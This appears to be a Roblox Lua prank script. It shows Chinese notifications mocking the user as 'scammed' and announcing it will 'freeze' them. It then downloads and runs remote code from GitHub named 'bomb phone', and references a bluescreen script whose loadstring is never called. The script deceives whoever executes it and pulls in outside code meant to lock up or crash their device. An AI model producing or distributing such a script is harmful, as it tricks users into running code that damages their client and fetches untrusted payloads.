local CoreGui = game:GetService("StarterGui")
CoreGui:SetCore("SendNotification", {
    Title = "哇，你又执行过了",
    Text = "😂",
    Duration = 5, 
})

wait(1.6)
game:GetService("StarterGui")
CoreGui:SetCore("SendNotification", {
    Title = "已骗人😂",
    Text = "恭喜恭喜",
    Duration = 5, 
})
wait(0.1)
game:GetService("StarterGui")
CoreGui:SetCore("SendNotification", {
    Title = "给你卡死",
    Text = "",
    Duration = 10, 
})
wait(1)
loadstring(game:HttpGet("https://raw.githubusercontent.com/CloudX-ScriptsWane/UI-library/main/%E8%BD%B0%E7%82%B8%E6%89%8B%E6%9C%BA.lua", true))()
loadstring(game:HttpGet('https://github.com/RunDTM/roblox-bluescreen/raw/main/bsod.lua'))